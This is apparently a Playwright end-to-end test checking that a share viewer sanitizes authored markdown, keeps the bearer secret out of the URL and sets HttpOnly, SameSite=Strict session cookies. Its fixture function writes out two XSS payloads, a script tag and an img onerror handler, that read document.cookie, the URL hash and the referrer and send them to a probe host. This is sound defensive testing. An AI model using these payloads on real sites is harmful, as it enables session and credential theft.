import { createHash } from "node:crypto";
import {
  type Request,
  type Response,
} from "@playwright/test";
import {
  expect,
  seedShare,
  test,
} from "./harness";

const RAW_SCRIPT_SENTINEL = "__dohcIso9CredentialRawScript_6a09e667";
const EVENT_HANDLER_SENTINEL = "__dohcIso9CredentialEventHandler_6a09e667";
const SENTINEL_BASELINE = "iso9credentials-unmodified-6a09e667";
const FAKE_AUTHORED_SESSION = "fakeSess1234";
const EXFILTRATION_PATHS = [
  "/iso9credentials-raw-script",
  "/iso9credentials-event-handler",
] as const;
const SAFE_PNG = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=",
  "base64",
);

function credentialFixture(probeUrl: string, safeBlobSha256: string): string {
  const scriptProbe = `${probeUrl}${EXFILTRATION_PATHS[0]}`;
  const eventProbe = `${probeUrl}${EXFILTRATION_PATHS[1]}`;
  return [
    "# Viewer credential browser conformance",
    "",
    `<script>window.${RAW_SCRIPT_SENTINEL}={cookie:document.cookie,hash:location.hash,referrer:document.referrer};fetch(${JSON.stringify(scriptProbe)}+"?cookie="+encodeURIComponent(document.cookie)+"&hash="+encodeURIComponent(location.hash)+"&referrer="+encodeURIComponent(document.referrer));</script>`,
    `<img src="missing-credential-probe.png" onerror='window.${EVENT_HANDLER_SENTINEL}={cookie:document.cookie,hash:location.hash,referrer:document.referrer};this.onerror=null;this.src="${eventProbe}?cookie="+encodeURIComponent(document.cookie)+"&hash="+encodeURIComponent(location.hash)+"&referrer="+encodeURIComponent(document.referrer)'>`,
    "",
    `![Seeded safe image](/api/view/blob/${safeBlobSha256}?session=${FAKE_AUTHORED_SESSION})`,
  ].join("\n");
}

function record(value: unknown): Record<string, unknown> | null {
  return value && typeof value === "object" && !Array.isArray(value)
    ? value as Record<string, unknown>
    : null;
}

function isExfiltrationRequest(request: Request): boolean {
  const url = new URL(request.url());
  return EXFILTRATION_PATHS.some((path) => url.pathname === path);
}

test("keeps the viewer bearer and authored credential probes outside page reach", async ({
  browser,
  probe,
  stack,
}) => {
  const safeBlobSha256 = createHash("sha256").update(SAFE_PNG).digest("hex");
  const seeded = await seedShare({
    relayUrl: stack.relayUrl,
    paths: ["docs"],
    files: [
      {
        path: "docs/credential-probe.md",
        content: credentialFixture(probe.url, safeBlobSha256),
      },
      { path: "docs/safe.png", content: SAFE_PNG, contentKind: "binary" },
    ],
  });
  const safeFile = seeded.files.find((file) => file.path === "docs/safe.png");
  if (!safeFile || safeFile.blobSha256 !== safeBlobSha256) {
    throw new Error("safe credential fixture was not seeded with the expected bytes");
  }

  const context = await browser.newContext();
  const exchangeRequests: Request[] = [];
  const exchangeResponses: Response[] = [];
  const safeImageRequests: Request[] = [];
  const safeImageResponses: Response[] = [];
  const exfiltrationRequests: Request[] = [];
  try {
    await context.addInitScript(
      ({ baseline, names }) => {
        for (const name of names) Reflect.set(window, name, baseline);
      },
      {
        baseline: SENTINEL_BASELINE,
        names: [RAW_SCRIPT_SENTINEL, EVENT_HANDLER_SENTINEL],
      },
    );
    context.on("request", (request) => {
      const url = new URL(request.url());
      if (url.pathname === "/api/exchange") exchangeRequests.push(request);
      if (url.pathname === `/api/view/blob/${safeBlobSha256}`) {
        safeImageRequests.push(request);
      }
      if (isExfiltrationRequest(request)) exfiltrationRequests.push(request);
    });
    context.on("response", (response) => {
      const url = new URL(response.url());
      if (url.pathname === "/api/exchange") exchangeResponses.push(response);
      if (url.pathname === `/api/view/blob/${safeBlobSha256}`) {
        safeImageResponses.push(response);
      }
    });

    const page = await context.newPage();
    await page.goto(`${stack.shareWebUrl}/s/#${seeded.secret}`);
    const article = page.locator("article.markdown");
    await expect(article).toContainText("Viewer credential browser conformance");
    const safeImage = article.getByRole("img", { name: "Seeded safe image" });
    await expect(safeImage).toBeVisible();
    await expect.poll(() => safeImageResponses.length).toBeGreaterThan(0);
    await page.waitForLoadState("networkidle");

    expect(exchangeRequests).toHaveLength(1);
    const exchangeRequestBody = record(exchangeRequests[0]!.postDataJSON());
    expect({
      keys: exchangeRequestBody ? Object.keys(exchangeRequestBody).sort() : [],
      secretHasBearerShape:
        typeof exchangeRequestBody?.secret === "string" &&
        /^[A-Za-z0-9_-]{43}$/u.test(exchangeRequestBody.secret),
      secretMatchesFragment: exchangeRequestBody?.secret === seeded.secret,
    }).toEqual({
      keys: ["secret"],
      secretHasBearerShape: true,
      secretMatchesFragment: true,
    });

    expect(exchangeResponses).toHaveLength(1);
    const exchangeResponse = exchangeResponses[0]!;
    const exchangeResponseBody = record(await exchangeResponse.json());
    const responseSession = typeof exchangeResponseBody?.session === "string"
      ? exchangeResponseBody.session
      : "";
    const responseStringValues = exchangeResponseBody
      ? Object.values(exchangeResponseBody).filter((value): value is string => typeof value === "string")
      : [];
    expect({
      hasAbsoluteUrl: responseStringValues.some((value) => /^https?:\/\//iu.test(value)),
      hasBearer: responseStringValues.some((value) => value === seeded.secret),
      hasRelayCapabilityShape: responseStringValues.some((value) =>
        /^[A-Za-z0-9_-]{43}$/u.test(value)
      ),
      keys: exchangeResponseBody ? Object.keys(exchangeResponseBody).sort() : [],
      ok: exchangeResponseBody?.ok,
      sessionHasExpectedShape: /^[A-Za-z0-9_-]{12}$/u.test(responseSession),
    }).toEqual({
      hasAbsoluteUrl: false,
      hasBearer: false,
      hasRelayCapabilityShape: false,
      keys: ["ok", "session"],
      ok: true,
      sessionHasExpectedShape: true,
    });

    const finalLocation = new URL(page.url());
    expect(finalLocation.origin).toBe(stack.shareWebUrl);
    expect(finalLocation.pathname).toBe(`/s/${responseSession}`);
    expect(finalLocation.search).toBe("");
    expect(finalLocation.hash).toBe("");
    expect(page.url().includes(seeded.secret)).toBe(false);
    expect(responseSession).not.toBe(FAKE_AUTHORED_SESSION);

    const setCookie = await exchangeResponse.headerValue("set-cookie");
    const cookieParts = setCookie?.split(";").map((part) => part.trim()) ?? [];
    const cookieNameValue = cookieParts[0] ?? "";
    const cookieSeparator = cookieNameValue.indexOf("=");
    const cookieName = cookieSeparator < 0 ? "" : cookieNameValue.slice(0, cookieSeparator);
    const cookieValue = cookieSeparator < 0 ? "" : cookieNameValue.slice(cookieSeparator + 1);
    const cookieAttributes = cookieParts.slice(1).map((part) => part.toLowerCase());
    expect({
      attributes: cookieAttributes
        .filter((attribute) => !attribute.startsWith("max-age="))
        .sort(),
      hasDomainAttribute: cookieAttributes.some((attribute) =>
        attribute.startsWith("domain=")
      ),
      hasPositiveMaxAge: cookieAttributes.some((attribute) =>
        /^max-age=[1-9][0-9]*$/u.test(attribute)
      ),
      name: cookieName,
      valueHasOpaqueShape: /^[A-Za-z0-9_-]{16,}$/u.test(cookieValue),
    }).toEqual({
      attributes: ["httponly", "path=/", "samesite=strict", "secure"],
      hasDomainAttribute: false,
      hasPositiveMaxAge: true,
      name: `dohc_share_${responseSession}`,
      valueHasOpaqueShape: true,
    });

    const shareCookies = (await context.cookies())
      .filter((cookie) => cookie.name.startsWith("dohc_share_"))
      .map((cookie) => ({
        domain: cookie.domain,
        hostOnlyEquivalent: cookie.domain === new URL(stack.shareWebUrl).hostname &&
          !cookie.domain.startsWith("."),
        httpOnly: cookie.httpOnly,
        name: cookie.name,
        path: cookie.path,
        sameSite: cookie.sameSite,
        secure: cookie.secure,
      }));
    expect(shareCookies).toEqual([{
      domain: "127.0.0.1",
      hostOnlyEquivalent: true,
      httpOnly: true,
      name: `dohc_share_${responseSession}`,
      path: "/",
      sameSite: "Strict",
      secure: true,
    }]);
    expect((await page.evaluate(() => document.cookie)).includes("dohc_share_"))
      .toBe(false);

    await expect(article.locator("script, [onerror], [onload]"))
      .toHaveCount(0);
    const sentinelsStayedAtBaseline = await page.evaluate(
      ({ baseline, names }) => names.map((name) => Reflect.get(window, name) === baseline),
      {
        baseline: SENTINEL_BASELINE,
        names: [RAW_SCRIPT_SENTINEL, EVENT_HANDLER_SENTINEL],
      },
    );
    expect(sentinelsStayedAtBaseline).toEqual([true, true]);
    expect(exfiltrationRequests).toHaveLength(0);
    expect(
      probe.requests.filter((request) =>
        EXFILTRATION_PATHS.some((path) => new URL(request.path, probe.url).pathname === path)
      ),
    ).toEqual([]);

    expect(safeImageRequests.length).toBeGreaterThan(0);
    expect(safeImageRequests.every((request) => {
      const url = new URL(request.url());
      return request.resourceType() === "image" &&
        url.searchParams.get("session") === responseSession &&
        url.searchParams.get("session") !== FAKE_AUTHORED_SESSION;
    })).toBe(true);
    expect(safeImageResponses.every((response) =>
      response.status() === 200 && response.headers()["content-type"] === "image/png"
    )).toBe(true);
    await expect(safeImage).toHaveAttribute(
      "src",
      `/api/view/blob/${safeBlobSha256}?session=${responseSession}`,
    );
    expect(await safeImage.evaluate((element) =>
      element instanceof HTMLImageElement &&
      element.complete &&
      element.naturalWidth === 1 &&
      element.naturalHeight === 1
    )).toBe(true);

    const finalUrl = page.url();
    await page.goto("about:blank");
    await page.goBack({ waitUntil: "domcontentloaded" });
    await expect(page.locator("article.markdown")).toContainText(
      "Viewer credential browser conformance",
    );
    expect(page.url()).toBe(finalUrl);
    expect(new URL(page.url()).hash).toBe("");
    expect(page.url().includes(seeded.secret)).toBe(false);
    expect(exchangeRequests).toHaveLength(1);
    expect(exfiltrationRequests).toHaveLength(0);
  } finally {
    await context.close();
  }
});
